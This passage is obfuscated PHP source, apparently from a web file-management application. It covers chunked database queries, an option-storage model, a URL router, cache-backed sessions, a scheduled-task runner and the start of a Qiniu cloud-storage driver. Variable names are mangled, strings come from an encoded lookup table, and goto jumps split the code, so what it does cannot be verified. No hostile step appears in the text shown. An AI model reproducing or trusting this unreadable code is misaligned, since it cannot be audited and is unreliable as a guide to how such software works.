$Ú’Ä »è[$Ùí‹®ôÖ[275]][$µ—À ñ][1] = $éãÜ‡€ª; $this->optionsValue($Ú’Ä »è); $‘ç¡ñî += parent::save($ÂåÖ±©«, $ÀµˆÒï»); $this->chunkEventCheck(count($éãÜ‡€ª)); } $this->chunkEventSet(); return $‘ç¡ñî; } public function add($ÈäğÛ¼ = '', $Ñó¶®ùë = array(), $¥ãïñ­ = false) { if ($this->addTaskStatus && is_array($ÈäğÛ¼)) { $this->addTaskData[] = $ÈäğÛ¼; return; } return parent::add($ÈäğÛ¼, $Ñó¶®ùë, $¥ãïñ­); } public function parseWhereLike($¬İöÛÏ, $ŒŒà÷¯ı = '', $ä¢›®£ = false, &$ÜÄÄ˜ô› = false) { $°»Œ¥‰¢ =& $_SERVER[ùÆÎÔ“Ñ]; $·§ß»¥½ = $GLOBALS[$°»Œ¥‰¢[6]][$°»Œ¥‰¢[381]]; if (!$·§ß»¥½[$°»Œ¥‰¢[382]]) { return $¬İöÛÏ; } if (!is_array($¬İöÛÏ)) { return $¬İöÛÏ; } $é·ıÉŞÑ = array(); $Õ»¨ÕÒ = 0; foreach ($¬İöÛÏ as $…ıèÙˆŠ => $•ÔÜ¾©‘) { if (is_array($•ÔÜ¾©‘) && count($•ÔÜ¾©‘) == 2 && $•ÔÜ¾©‘[0] == $°»Œ¥‰¢[383] && is_string($•ÔÜ¾©‘[1]) && substr($•ÔÜ¾©‘[1], 0, 1) == $°»Œ¥‰¢[384] && substr($•ÔÜ¾©‘[1], strlen($•ÔÜ¾©‘[1]) - 1, 1) == $°»Œ¥‰¢[384]) { $ÜÄÄ˜ô› = !0; $µÎ‘­ÜÚ = is_string($…ıèÙˆŠ) ? $…ıèÙˆŠ : $ŒŒà÷¯ı; $Á®÷‚Îİ = substr($•ÔÜ¾©‘[1], 1, strlen($•ÔÜ¾©‘[1]) - 2); $Á®÷‚Îİ = $this->db->escapeString($Á®÷‚Îİ); if (!strpos($µÎ‘­ÜÚ, $°»Œ¥‰¢[10])) { $µÎ‘­ÜÚ = $°»Œ¥‰¢[385] . $µÎ‘­ÜÚ . $°»Œ¥‰¢[385]; } $‘ı“á¸† = $°»Œ¥‰¢[188] . $Á®÷‚Îİ . $°»Œ¥‰¢[188]; $Á®÷‚Îİ = str_replace(array($°»Œ¥‰¢[10], $°»Œ¥‰¢[386], $°»Œ¥‰¢[11]), $°»Œ¥‰¢[387], $Á®÷‚Îİ); if ($·§ß»¥½[$°»Œ¥‰¢[388]]) { $‘ı“á¸† = $°»Œ¥‰¢[389] . $Á®÷‚Îİ . $°»Œ¥‰¢[390]; if ($·§ß»¥½[$°»Œ¥‰¢[391]]) { $‘ı“á¸† = $°»Œ¥‰¢[390] . $Á®÷‚Îİ . $°»Œ¥‰¢[389]; } } $é·ıÉŞÑ[$Õ»¨ÕÒ] = $°»Œ¥‰¢[392] . $µÎ‘­ÜÚ . $°»Œ¥‰¢[393] . $‘ı“á¸† . $°»Œ¥‰¢[394]; $Õ»¨ÕÒ++; continue; } if (is_array($•ÔÜ¾©‘)) { $ŒŒà÷¯ı = is_string($…ıèÙˆŠ) ? $…ıèÙˆŠ : $ŒŒà÷¯ı; $•ÔÜ¾©‘ = $this->parseWhereLike($•ÔÜ¾©‘, $ŒŒà÷¯ı, !0, $ÜÄÄ˜ô›); } if (is_numeric($…ıèÙˆŠ)) { $é·ıÉŞÑ[$Õ»¨ÕÒ] = $•ÔÜ¾©‘; $Õ»¨ÕÒ++; } else { $é·ıÉŞÑ[$…ıèÙˆŠ] = $•ÔÜ¾©‘; } } if ($ÜÄÄ˜ô› && !$ä¢›®£) { } return $é·ıÉŞÑ; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($ƒ —çé = array()) { $ã˜ãÔ×² =& $_SERVER[ùÆÎÔ“Ñ]; $Å £úÁ× = self::SQL_WHERE_IN_CHUNK; $ô„¦ñÙ² = $this->optionsValue(); $µ´šËŞÙ = $this->findWhereField($ô„¦ñÙ²); if (!$µ´šËŞÙ || isset($ô„¦ñÙ²[$ã˜ãÔ×²[292]]) || isset($ô„¦ñÙ²[$ã˜ãÔ×²[353]])) { return parent::select($ƒ —çé); } $¥é£ö = $ô„¦ñÙ²[$ã˜ãÔ×²[275]][$µ´šËŞÙ][1]; $¥é£ö = is_array($¥é£ö) ? $¥é£ö : array(); $¥ü‚Î é = null; for ($¶âÚ¬Â = 0; $¶âÚ¬Â < count($¥é£ö); $¶âÚ¬Â += $Å £úÁ×) { $“ø®°‹¸ = array_slice($¥é£ö, $¶âÚ¬Â, $Å £úÁ×); if (!is_array($“ø®°‹¸) || count($“ø®°‹¸) == 0) { break; } $ô„¦ñÙ²[$ã˜ãÔ×²[275]][$µ´šËŞÙ][1] = $“ø®°‹¸; $this->optionsValue($ô„¦ñÙ²); $ÂšÃ«„¹ = parent::select($ƒ —çé); if (!$ÂšÃ«„¹) { continue; } $¥ü‚Î é = is_array($¥ü‚Î é) ? $¥ü‚Î é : array(); $¥ü‚Î é = array_merge($¥ü‚Î é, $ÂšÃ«„¹); } return $¥ü‚Î é; } public function delete($íäú»ì = array()) { $ÕŠ“ƒìù =& $_SERVER[ùÆÎÔ“Ñ]; $ò¶šÔà = self::SQL_WHERE_IN_CHUNK; $û×ƒÛêÛ = $this->optionsValue(); $—èàËÈç = $this->findWhereField($û×ƒÛêÛ); if (!$—èàËÈç) { return parent::delete($íäú»ì); } $†Å¤Á• = 0; $Ÿ¯œİÜ¼ = $û×ƒÛêÛ[$ÕŠ“ƒìù[275]][$—èàËÈç][1]; $Ÿ¯œİÜ¼ = is_array($Ÿ¯œİÜ¼) ? $Ÿ¯œİÜ¼ : array(); for ($ë‰¥ê· = 0; $ë‰¥ê· < count($Ÿ¯œİÜ¼); $ë‰¥ê· += $ò¶šÔà) { $Ãœ×Èïª = array_slice($Ÿ¯œİÜ¼, $ë‰¥ê·, $ò¶šÔà); if (!is_array($Ãœ×Èïª) || count($Ãœ×Èïª) == 0) { break; } $û×ƒÛêÛ[$ÕŠ“ƒìù[275]][$—èàËÈç][1] = $Ãœ×Èïª; $this->optionsValue($û×ƒÛêÛ); $†Å¤Á• += parent::delete($íäú»ì); } return $†Å¤Á•; } private function findWhereField($şÚˆ”Šä) { $µÔ™‰µ =& $_SERVER[ùÆÎÔ“Ñ]; $ÄÙ›í–¾ = self::SQL_WHERE_IN_CHUNK; if (!is_array($şÚˆ”Šä) || !is_array($şÚˆ”Šä[$µÔ™‰µ[275]])) { return !1; } foreach ($şÚˆ”Šä[$µÔ™‰µ[275]] as $À’¾„ => $ĞÜŒƒ«æ) { if (is_array($ĞÜŒƒ«æ) && isset($ĞÜŒƒ«æ[0]) && is_string($ĞÜŒƒ«æ[0]) && strtolower($ĞÜŒƒ«æ[0]) == $µÔ™‰µ[7] && is_array($ĞÜŒƒ«æ[1]) && count($ĞÜŒƒ«æ[1]) > $ÄÙ›í–¾) { ignore_timeout(); return $À’¾„; } } return !1; } public function setMasterDB($§™úØÑÈ = true) { think_config($_SERVER[ùÆÎÔ“Ñ][395], $§™úØÑÈ); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\x79\163\164\x65\x6d\x4f\160\x74\x69\157\156"; public $field = array(); public function listData($½õóâö¤ = false, $éë–ƒ € = "\155\x6f\x64\x69\x66\171\x54\x69\x6d\x65", $ú›Ë°¸Ä = false) { $»’¨âàÅ = Model($this->modelType)->get(!1, $this->optionType, !0); $—ä±ª¾ = array_values($»’¨âàÅ); if ($—ä±ª¾ && $—ä±ª¾[0] && !is_array($—ä±ª¾[0])) { Model($this->modelType)->cacheRemove($this->optionType); $»’¨âàÅ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$»’¨âàÅ) { return $½õóâö¤ ? null : array(); } if (!$½õóâö¤) { $»’¨âàÅ = array_filter(array_values($»’¨âàÅ)); return array_sort_by($»’¨âàÅ, $éë–ƒ €, $ú›Ë°¸Ä); } return $»’¨âàÅ[$_SERVER[ùÆÎÔ“Ñ][396] . $½õóâö¤]; } public function insert($êøŒûİ¤) { $ŸÆŸÒ¤× =& $_SERVER[ùÆÎÔ“Ñ]; $êøŒûİ¤ = array_field_key($êøŒûİ¤, $this->field); $Ö÷‹éşñ = Model($this->modelType)->get($ŸÆŸÒ¤×[397], $this->optionType . $ŸÆŸÒ¤×[398]); $Ö÷‹éşñ = $Ö÷‹éşñ ? $Ö÷‹éşñ : 0; $êøŒûİ¤[$ŸÆŸÒ¤×[399]] = ++$Ö÷‹éşñ; $êøŒûİ¤[$ŸÆŸÒ¤×[200]] = time(); $êøŒûİ¤[$ŸÆŸÒ¤×[85]] = time(); Model($this->modelType)->set($ŸÆŸÒ¤×[397], $Ö÷‹éşñ, $this->optionType . $ŸÆŸÒ¤×[398]); Model($this->modelType)->set($ŸÆŸÒ¤×[396] . $Ö÷‹éşñ, $êøŒûİ¤, $this->optionType); return $Ö÷‹éşñ; } public function update($Ç•§¶ƒ©, $üÔôëîÂ) { $óª÷˜§² =& $_SERVER[ùÆÎÔ“Ñ]; $üÔôëîÂ = array_field_key($üÔôëîÂ, $this->field); $øòó¥ÉÈ = $this->listData($Ç•§¶ƒ©); if (!$øòó¥ÉÈ || !$Ç•§¶ƒ©) { return !1; } $üÔôëîÂ = array_merge($øòó¥ÉÈ, $üÔôëîÂ); $üÔôëîÂ[$óª÷˜§²[85]] = time(); return Model($this->modelType)->set($óª÷˜§²[396] . $Ç•§¶ƒ©, $üÔôëîÂ, $this->optionType); } public function remove($¤„³²‘«) { if (!$¤„³²‘«) { return !1; } return Model($this->modelType)->remove($_SERVER[ùÆÎÔ“Ñ][396] . $¤„³²‘«, $this->optionType); } public function clear() { $“ºÖ¬ùŸ =& $_SERVER[ùÆÎÔ“Ñ]; Model($this->modelType)->remove($“ºÖ¬ùŸ[397], $this->optionType . $“ºÖ¬ùŸ[398]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($àÅÀüâ, $ó” ™¢) { if (!$ó” ™¢) { return !1; } $Šõ÷«¸ = $this->listData(); $Šõ÷«¸ = array_to_keyvalue($Šõ÷«¸, $àÅÀüâ); return isset($Šõ÷«¸[$ó” ™¢]) ? $Šõ÷«¸[$ó” ™¢] : !1; } public function findByName($ğ¼¿ĞÊ) { return $this->findByKey($_SERVER[ùÆÎÔ“Ñ][32], $ğ¼¿ĞÊ); } protected function resetData($ àß»Ûà) { $èéÆİŸ =& $_SERVER[ùÆÎÔ“Ñ]; $ àß»Ûà = is_array($ àß»Ûà) ? $ àß»Ûà : array(); $›±­œ•Ò = array(); for ($‹œ´Ï„Ğ = 0; $‹œ´Ï„Ğ < count($ àß»Ûà); $‹œ´Ï„Ğ++) { $›±­œ•Ò[$èéÆİŸ[396] . $ àß»Ûà[$‹œ´Ï„Ğ][$èéÆİŸ[399]]] = $ àß»Ûà[$‹œ´Ï„Ğ]; } return Model($this->modelType)->set($›±­œ•Ò, !1, $this->optionType); } private function getAutoName($ĞÍï…õ¤) { $Ş•Ö´§ = array_to_keyvalue($this->listData(), $_SERVER[ùÆÎÔ“Ñ][32]); if (!$Ş•Ö´§ || !isset($Ş•Ö´§[$ĞÍï…õ¤])) { return $ĞÍï…õ¤; } for ($¹üùíğĞ = 1; $¹üùíğĞ < count($Ş•Ö´§); $¹üùíğĞ++) { $‚£ìı–› = $ĞÍï…õ¤ . "\50{$¹üùíğĞ}\51"; if (!isset($Ş•Ö´§[$‚£ìı–›])) { return $‚£ìı–›; } } return $‚£ìı–›; } } goto c›Ì—×ƒäˆ; eÉƒà‘İõ‘: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\x6e\x79" => "\x5b\x5e\x2f\135\x2b", "\x3a\156\x75\x6d" => "\x5b\x30\x2d\x39\135\53", "\72\141\154\154" => "\x2e\52"); public static $errorCallback; public static function __callstatic($¤Á›ÚŒÕ, $Ò €û‘) { $ÊŸ¼“„œ =& $_SERVER[ùÆÎÔ“Ñ]; if ($¤Á›ÚŒÕ == $ÊŸ¼“„œ[1612]) { $ô¾çÊ°ï = array_map($ÊŸ¼“„œ[1613], $Ò €û‘[0]); $·›–­—ê = strpos($Ò €û‘[1], $ÊŸ¼“„œ[8]) === 0 ? $Ò €û‘[1] : $ÊŸ¼“„œ[8] . $Ò €û‘[1]; $€¢Ş‹í = $Ò €û‘[2]; } else { $ô¾çÊ°ï = null; $·›–­—ê = strpos($Ò €û‘[0], $ÊŸ¼“„œ[8]) === 0 ? $Ò €û‘[0] : $ÊŸ¼“„œ[8] . $Ò €û‘[0]; $€¢Ş‹í = $Ò €û‘[1]; } array_push(self::$maps, $ô¾çÊ°ï); array_push(self::$routes, $·›–­—ê); array_push(self::$methods, strtoupper($¤Á›ÚŒÕ)); array_push(self::$callbacks, $€¢Ş‹í); } public static function error($àíøé±è) { self::$errorCallback = $àíøé±è; } public static function haltOnMatch($ÃøĞ–û¥ = true) { self::$halts = $ÃøĞ–û¥; } public static function dispatch() { $“¼¡¸¯É =& $_SERVER[ùÆÎÔ“Ñ]; $™ŞØŸµ = parse_url($_SERVER[$“¼¡¸¯É[1614]], PHP_URL_PATH); $ÌÉÛ‘Ö® = $_SERVER[$“¼¡¸¯É[159]]; $˜ñ„ìÛ­ = array_keys(static::$patterns); $ÅëÎ“ùŞ = array_values(static::$patterns); $ú±«æÔ­ = !1; self::$routes = preg_replace($“¼¡¸¯É[1282], $“¼¡¸¯É[8], self::$routes); if (in_array($™ŞØŸµ, self::$routes)) { $·üÕ°š = array_keys(self::$routes, $™ŞØŸµ); foreach ($·üÕ°š as $ĞÂı›Í) { if (self::$methods[$ĞÂı›Í] == $ÌÉÛ‘Ö® || self::$methods[$ĞÂı›Í] == $“¼¡¸¯É[1615] || in_array($ÌÉÛ‘Ö®, self::$maps[$ĞÂı›Í])) { $ú±«æÔ­ = !0; if (!is_object(self::$callbacks[$ĞÂı›Í])) { $âÍç£Ê = explode($“¼¡¸¯É[8], self::$callbacks[$ĞÂı›Í]); $ŸÍ¯üÔ¾ = end($âÍç£Ê); $Ôù¸ = explode($“¼¡¸¯É[1214], $ŸÍ¯üÔ¾); $Ç§ô–½‚ = new $Ôù¸[0](); $Ç§ô–½‚->{$Ôù¸[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$ĞÂı›Í]); if (self::$halts) { return; } } } } } else { $£ùÑ´ğß = 0; foreach (self::$routes as $ĞÂı›Í) { if (strpos($ĞÂı›Í, $“¼¡¸¯É[4]) !== !1) { $ĞÂı›Í = str_replace($˜ñ„ìÛ­, $ÅëÎ“ùŞ, $ĞÂı›Í); } if (preg_match($“¼¡¸¯É[1616] . $ĞÂı›Í . $“¼¡¸¯É[1617], $™ŞØŸµ, $—š¨ïóô)) { if (self::$methods[$£ùÑ´ğß] == $ÌÉÛ‘Ö® || self::$methods[$£ùÑ´ğß] == $“¼¡¸¯É[1615] || !empty(self::$maps[$£ùÑ´ğß]) && in_array($ÌÉÛ‘Ö®, self::$maps[$£ùÑ´ğß])) { $ú±«æÔ­ = !0; array_shift($—š¨ïóô); if (!is_object(self::$callbacks[$£ùÑ´ğß])) { $âÍç£Ê = explode($“¼¡¸¯É[8], self::$callbacks[$£ùÑ´ğß]); $ŸÍ¯üÔ¾ = end($âÍç£Ê); $Ôù¸ = explode($“¼¡¸¯É[1214], $ŸÍ¯üÔ¾); $Ç§ô–½‚ = new $Ôù¸[0](); if (!method_exists($Ç§ô–½‚, $Ôù¸[1])) { echo $“¼¡¸¯É[1618]; } else { call_user_func_array(array($Ç§ô–½‚, $Ôù¸[1]), $—š¨ïóô); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$£ùÑ´ğß], $—š¨ïóô); if (self::$halts) { return; } } } } $£ùÑ´ğß++; } } if ($ú±«æÔ­ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $µİ¥ã°ò =& $_SERVER[ùÆÎÔ“Ñ]; header($_SERVER[$µİ¥ã°ò[1619]] . $µİ¥ã°ò[1620]); echo $µİ¥ã°ò[1621]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$“¼¡¸¯É[1614]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $„ï ´ë =& $_SERVER[ùÆÎÔ“Ñ]; static $à¢ğ“¶¹ = false; if ($à¢ğ“¶¹) { return $à¢ğ“¶¹; } $âª÷Ñ†á = $GLOBALS[$„ï ´ë[6]][$„ï ´ë[349]]; self::$sessionTime = $âª÷Ñ†á[$„ï ´ë[1622]]; $Ş´«´÷€ = isset($GLOBALS[$„ï ´ë[1623]]) ? $GLOBALS[$„ï ´ë[1623]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($Ş´«´÷€)) { self::$sessionSign = Cookie::get($Ş´«´÷€); } else { self::$sessionSign = guid(); } } Cookie::setSafe($Ş´«´÷€, self::$sessionSign, self::$sessionTime); $­‡ˆŸ˜Å = $âª÷Ñ†á[$„ï ´ë[1624]]; $ÃÎ¢û™í = $âª÷Ñ†á[$­‡ˆŸ˜Å]; $Ğò¢¸ = $âª÷Ñ†á[$„ï ´ë[829]]; switch ($­‡ˆŸ˜Å) { case $„ï ´ë[21]: self::$handle = Model($„ï ´ë[830]); break; case $„ï ´ë[831]: self::$handle = new CacheRedis($ÃÎ¢û™í, $Ğò¢¸); break; case $„ï ´ë[832]: self::$handle = new CacheMemcached($ÃÎ¢û™í, $Ğò¢¸); break; case $„ï ´ë[199]: $ÃÎ¢û™í[$„ï ´ë[84]] = $ÃÎ¢û™í[$„ï ´ë[84]] . $„ï ´ë[1625]; self::$handle = new CacheFile($ÃÎ¢û™í, $Ğò¢¸); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $à¢ğ“¶¹ = new self(); return $à¢ğ“¶¹; } public static function getBySign($ÖˆÏ²«) { CacheLock::lock($ÖˆÏ²«); $Íº€°šÅ = self::$handle->get($ÖˆÏ²«); CacheLock::unlock($ÖˆÏ²«); $Íº€°šÅ = unserialize($Íº€°šÅ); return is_array($Íº€°šÅ) ? $Íº€°šÅ : array(); } public static function setBySign($ñê­ÚÕ½, $Ùüè½óÍ) { CacheLock::lock($ñê­ÚÕ½); self::$handle->set($ñê­ÚÕ½, serialize($Ùüè½óÍ), self::$sessionTime); CacheLock::unlock($ñê­ÚÕ½); } public static function sign($å×°×Çş = false) { $å×°×Çş && (self::$sessionSign = $å×°×Çş); self::init(); return self::$sessionSign; } public static function set($…ø¥‰ –, $ìáá™… = false) { self::init(); if (is_array($…ø¥‰ –)) { foreach ($…ø¥‰ – as $·¡÷Êæ© => $Ú²´¶Àİ) { array_set_value(self::$data, $·¡÷Êæ©, $Ú²´¶Àİ); } } else { array_set_value(self::$data, $…ø¥‰ –, $ìáá™…); } self::setBySign(self::$sessionSign, self::$data); } public static function get($øÊÃœ¾À = false) { self::init(); if (!$øÊÃœ¾À) { return self::$data; } return array_get_value(self::$data, $øÊÃœ¾À); } public static function remove($£³¾şã›) { self::init(); unset(self::$data[$£³¾şã›]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[ùÆÎÔ“Ñ][834])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $ˆ­ëÒíè =& $_SERVER[ùÆÎÔ“Ñ]; if (self::valueGet($ˆ­ëÒíè[751]) != $ˆ­ëÒíè[88]) { return; } if (self::valueGet($ˆ­ëÒíè[1626]) == $ˆ­ëÒíè[88]) { $¡àéïÈ = self::valueGet($ˆ­ëÒíè[1627]); if (time() - $¡àéïÈ > self::AUTO_RESTART_TIME) { self::restart(); } return; } http_close(); $GLOBALS[$ˆ­ëÒíè[1628]] = 1; self::valueSet($ˆ­ëÒíè[1626], $ˆ­ëÒíè[88]); self::log($ˆ­ëÒíè[1629] . ACTION . $ˆ­ëÒíè[1630]); Session::$data = array(); Session::$sessionSign = $ˆ­ëÒíè[12]; $GLOBALS[$ˆ­ëÒíè[503]] = 1; Hook::bind($ˆ­ëÒíè[1631], $ˆ­ëÒíè[1632]); $¦¼§½Óƒ = 0; while (!0) { self::cacheClear(); if (self::valueGet($ˆ­ëÒíè[751]) != $ˆ­ëÒíè[88]) { self::valueSet($ˆ­ëÒíè[1626], $ˆ­ëÒíè[197]); self::log($ˆ­ëÒíè[1633]); die; } $¡ÏÃšƒ– = time(); if ($¡ÏÃšƒ– - $¦¼§½Óƒ >= 60) { self::valueSet(array($ˆ­ëÒíè[1626] => $ˆ­ëÒíè[88], $ˆ­ëÒíè[1627] => $¡ÏÃšƒ–), !1); $¦¼§½Óƒ = $¡ÏÃšƒ–; } if (!file_exists(USER_SYSTEM . $ˆ­ëÒíè[1634])) { self::valueSet(array($ˆ­ëÒíè[1626] => $ˆ­ëÒíè[197], $ˆ­ëÒíè[751] => $ˆ­ëÒíè[197]), !1); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function restart() { $Ú©¾ã³Â =& $_SERVER[ùÆÎÔ“Ñ]; http_close(); self::valueSet($Ú©¾ã³Â[751], $Ú©¾ã³Â[197]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($Ú©¾ã³Â[1626] => $Ú©¾ã³Â[197], $Ú©¾ã³Â[751] => $Ú©¾ã³Â[88]), !1); } public static function taskSwitch() { $ù„»¬šÖ =& $_SERVER[ùÆÎÔ“Ñ]; $ËìıÑÃÒ = self::valueGet($ù„»¬šÖ[751]) == $ù„»¬šÖ[88] ? $ù„»¬šÖ[197] : $ù„»¬šÖ[88]; self::valueSet($ù„»¬šÖ[751], $ËìıÑÃÒ); } public static function shutdownEvent() { $é·Û’ä =& $_SERVER[ùÆÎÔ“Ñ]; self::valueSet($é·Û’ä[1626], $é·Û’ä[197]); self::log($é·Û’ä[1635]); } public static function config($®Â™Ú°é, $ãôìÆø) { self::valueSet($_SERVER[ùÆÎÔ“Ñ][751], $®Â™Ú°é); } private static function taskRunAll() { $úòû×·Ó =& $_SERVER[ùÆÎÔ“Ñ]; $šŞ»ª´È = timeFloat(); $×ì•ÖÁ² = Model($úòû×·Ó[1636])->listData(); $Ôêæ• = count($×ì•ÖÁ²); for ($æ¤Ìƒ÷Ç = 0; $æ¤Ìƒ÷Ç < $Ôêæ•; $æ¤Ìƒ÷Ç++) { $Ú¡ŸªºÁ = $×ì•ÖÁ²[$æ¤Ìƒ÷Ç]; if (!$Ú¡ŸªºÁ[$úòû×·Ó[399]] || $Ú¡ŸªºÁ[$úòû×·Ó[1637]] != $úòû×·Ó[88]) { continue; } if (!self::taskTimeCheck($Ú¡ŸªºÁ)) { continue; } self::taskRun($Ú¡ŸªºÁ); } Hook::trigger($úòû×·Ó[1638]); self::taskQueueRun($šŞ»ª´È); } private static function taskQueueRun($ş°òÛÏ) { $Ã‘»×ƒİ = 10; while (!0) { $Ã±Æ÷Ü = TaskQueue::run(); if ($Ã±Æ÷Ü === !1) { break; } if (timeFloat() - $ş°òÛÏ >= $Ã‘»×ƒİ) { break; } } } private static function taskTimeCheck($—Òôå¤Ú) { $Ğ—òÑäê =& $_SERVER[ùÆÎÔ“Ñ]; $šşß³›° = json_decode($—Òôå¤Ú[$Ğ—òÑäê[203]], !0); $Ãõ›ş‚Ÿ = intval($—Òôå¤Ú[$Ğ—òÑäê[1627]]); $¥ğ§£·Œ = strtotime($Ğ—òÑäê[1639] . $šşß³›°[$Ğ—òÑäê[1640]] . $Ğ—òÑäê[1641]) - strtotime($Ğ—òÑäê[1642]); $òãõì‡ø = time() - strtotime(date($Ğ—òÑäê[1643]) . $Ğ—òÑäê[1644]); $Ãß¨‹úö = $òãõì‡ø >= $¥ğ§£·Œ && $òãõì‡ø <= $¥ğ§£·Œ + 3600; switch ($šşß³›°[$Ğ—òÑäê[33]]) { case $Ğ—òÑäê[1645]: if (time() - $Ãõ›ş‚Ÿ < 3600 * 24 * 30) { return !1; } if ($šşß³›°[$Ğ—òÑäê[1645]] == date($Ğ—òÑäê[1646]) && $Ãß¨‹úö) { return !0; } break; case $Ğ—òÑäê[1647]: if (time() - $Ãõ›ş‚Ÿ < 3600 * 24 * 7) { return !1; } $¬¼¾±¶ = date($Ğ—òÑäê[1648]) == 0 ? 7 : date($Ğ—òÑäê[1648]); if ($šşß³›°[$Ğ—òÑäê[1647]] == $¬¼¾±¶ && $Ãß¨‹úö) { return !0; } break; case $Ğ—òÑäê[1640]: if (time() - $Ãõ›ş‚Ÿ < 3600 * 24) { return !1; } if ($Ãß¨‹úö) { return !0; } break; case $Ğ—òÑäê[1649]: if (time() - $Ãõ›ş‚Ÿ >= floatval($šşß³›°[$Ğ—òÑäê[1649]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $áóü€¬ =& $_SERVER[ùÆÎÔ“Ñ]; static $ıôØæ’ó = 0; $œ½ãƒ«ê = 300; if (!$ıôØæ’ó) { $ıôØæ’ó = time(); } if (time() - $ıôØæ’ó < $œ½ãƒ«ê) { return; } $ıôØæ’ó = time(); $ˆ¾ÊÄö  = Model($áóü€¬[513])->db($áóü€¬[12]); if ($ˆ¾ÊÄö ) { $ˆ¾ÊÄö ->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($áóü€¬[1650], $áóü€¬[1651]); die; } } public static function taskRun($Ò©ˆ¯åı) { $à¶Ê¥¥ =& $_SERVER[ùÆÎÔ“Ñ]; self::log($à¶Ê¥¥[1652] . $Ò©ˆ¯åı[$à¶Ê¥¥[399]] . $à¶Ê¥¥[1653] . $Ò©ˆ¯åı[$à¶Ê¥¥[32]] . $à¶Ê¥¥[1654] . $Ò©ˆ¯åı[$à¶Ê¥¥[1655]]); Model($à¶Ê¥¥[1636])->run($Ò©ˆ¯åı[$à¶Ê¥¥[399]]); $Ì¾ƒĞ¶ì = timeFloat(); $”¨ƒäø = $à¶Ê¥¥[12]; switch ($Ò©ˆ¯åı[$à¶Ê¥¥[33]]) { case $à¶Ê¥¥[307]: $Š´–·„à = url_request($Ò©ˆ¯åı[$à¶Ê¥¥[1655]], $à¶Ê¥¥[230], !1, !1, !1, !1, 10); if ($Š´–·„à[$à¶Ê¥¥[751]]) { $”¨ƒäø = strlen($Š´–·„à[$à¶Ê¥¥[1208]]); } break; case $à¶Ê¥¥[229]: $”¨ƒäø = Hook::apply($Ò©ˆ¯åı[$à¶Ê¥¥[1655]]); default: break; } Model($à¶Ê¥¥[1656])->add(array($à¶Ê¥¥[1657] => $à¶Ê¥¥[12], $à¶Ê¥¥[1658] => $à¶Ê¥¥[197], $à¶Ê¥¥[33] => $à¶Ê¥¥[1659] . $Ò©ˆ¯åı[$à¶Ê¥¥[399]], $à¶Ê¥¥[1660] => json_encode(array($à¶Ê¥¥[32] => $Ò©ˆ¯åı[$à¶Ê¥¥[32]], $à¶Ê¥¥[1661] => timeFloat() - $Ì¾ƒĞ¶ì, $à¶Ê¥¥[293] => $”¨ƒäø)))); $½›¨—î = $”¨ƒäø ? $à¶Ê¥¥[1662] . $”¨ƒäø : $à¶Ê¥¥[12]; self::log($à¶Ê¥¥[1663] . $Ò©ˆ¯åı[$à¶Ê¥¥[399]] . $à¶Ê¥¥[164] . $½›¨—î); return !0; } private static function valueGet($šÄĞÊ”˜) { $ëã©ì”¬ =& $_SERVER[ùÆÎÔ“Ñ]; $Ô„“â£÷ = $ëã©ì”¬[1664]; $›ùõÇø¡ = Model($ëã©ì”¬[435])->get($šÄĞÊ”˜, $Ô„“â£÷); if (is_null($›ùõÇø¡)) { Model($ëã©ì”¬[435])->set($ëã©ì”¬[751], $ëã©ì”¬[88], $Ô„“â£÷); Model($ëã©ì”¬[435])->set($ëã©ì”¬[1626], $ëã©ì”¬[197], $Ô„“â£÷); $›ùõÇø¡ = Model($ëã©ì”¬[435])->get($šÄĞÊ”˜, $Ô„“â£÷); } return $›ùõÇø¡; } private static function valueSet($«êÌèñÍ, $Çªè€›) { $ä×Ò«¢€ =& $_SERVER[ùÆÎÔ“Ñ]; $¦İşÄ¬• = $ä×Ò«¢€[1665]; CacheLock::lock($¦İşÄ¬•); $äâ»§ô¼ = Model($ä×Ò«¢€[435])->set($«êÌèñÍ, $Çªè€›, $ä×Ò«¢€[1664]); CacheLock::unlock($¦İşÄ¬•); return $äâ»§ô¼; } protected static function log($…ŞûáŠÔ) { write_log($…ŞûáŠÔ, $_SERVER[ùÆÎÔ“Ñ][1651]); } private static function cacheClear() { $åÔÛ»û¨ =& $_SERVER[ùÆÎÔ“Ñ]; Cache::clearMemory(Model($åÔÛ»û¨[435])->cacheKey($åÔÛ»û¨[1664])); Cache::clearMemory(Model($åÔÛ»û¨[435])->cacheKey($åÔÛ»û¨[1666])); Model($åÔÛ»û¨[1636])->cacheClear(); self::closeDatabase(); } } goto DÇ½…”İ…; A§°áÍ§à£: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function 